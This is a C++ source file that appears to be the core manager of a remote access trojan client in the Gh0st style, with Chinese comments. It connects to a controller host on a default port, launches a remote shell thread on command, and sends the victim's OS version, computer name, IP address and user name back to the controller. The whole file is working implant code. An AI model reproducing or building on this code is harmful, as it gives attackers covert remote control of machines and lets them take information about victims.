// KernelManager.cpp: implementation of the CKernelManager class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "KernelManager.h"
#include "loop.h"
wchar_t	CKernelManager::m_ServerHost[256] = {0};
UINT	CKernelManager::m_ServerPort = 9527;
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CKernelManager::CKernelManager(
	CClientSocket *pClient,
	LPCTSTR lpszServerHost,
	UINT nServerPort
			) : CManager(pClient)
{

	if (lpszServerHost != NULL)
		lstrcpy(m_ServerHost, lpszServerHost);
	m_ServerPort = nServerPort;
	m_nThreadCount = 0;
	m_bIsActived = false;
}

CKernelManager::~CKernelManager()
{
	for(int i = 0; i < m_nThreadCount; i++)
	{
		TerminateThread(m_hThread[i], -1);
		CloseHandle(m_hThread[i]);
	}
}
// 加上激活
void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{

	Cmd *cmd = (Cmd *)lpBuffer;

	switch (cmd->command)
	{
	case COMMAND_ACTIVED:
		InterlockedExchange((LONG *)&m_bIsActived, true);
		break;
//  	case COMMAND_FILEMANAGER: // 文件管理
//  		m_hThread[m_nThreadCount++] = (HANDLE)_beginthreadex(NULL, 0, Loop_FileManager, 
//  			NULL, 0, NULL);
//  		break;
	case COMMAND_SHELLMANAGER: // 远程sehll
		
		m_hThread[m_nThreadCount++] = (HANDLE)_beginthreadex(NULL, 0, Loop_ShellManager, 
			(void*)cmd->DialogPointer, 0, NULL);
		break;
	case COMMAND_REPLAY_HEARTBEAT: // 回复心跳包
		break;
	}	
}

bool CKernelManager::IsActived()
{
	return	m_bIsActived;	
}

int CKernelManager::sendLoginInfo()
{
	// 登录信息
	LOGININFO	LoginInfo;
	memset(&LoginInfo,0,sizeof(LOGININFO));
	//////////////////////////////////////////////////////////////////////////
	// 开始构造数据
	LoginInfo.bToken = BASE_TOKEN_LOGIN;
	LoginInfo.OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionEx((OSVERSIONINFO *)&LoginInfo.OsVerInfoEx); 
	//////////////////////////////////////////////////////////////////////////
	// get host name
	wchar_t hostname[50] = {0};
	DWORD	dwComputerNameLen = 50;
	GetComputerName(hostname,&dwComputerNameLen);
	memcpy(&LoginInfo.HostName, hostname, sizeof(LoginInfo.HostName));
	//////////////////////////////////////////////////////////////////////////
	// get sock addr
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	getsockname(m_pClient->m_Socket ,(SOCKADDR*)&sockAddr, &nSockAddrLen);
	memcpy(&LoginInfo.IPAddress, (void *)&sockAddr.sin_addr, sizeof(IN_ADDR));
	
	//////////////////////////////////////////////////////////////////////////
	// Get username
	wchar_t username[50] = {0};   
	DWORD cbUser = 50;       
	GetUserName (username, &cbUser);
	memcpy(&LoginInfo.UserName, username, sizeof(LoginInfo.UserName));
	//////////////////////////////////////////////////////////////////////////

	int nRet = m_pClient->Send((LPBYTE)&LoginInfo, sizeof(LOGININFO));

	return 0;
}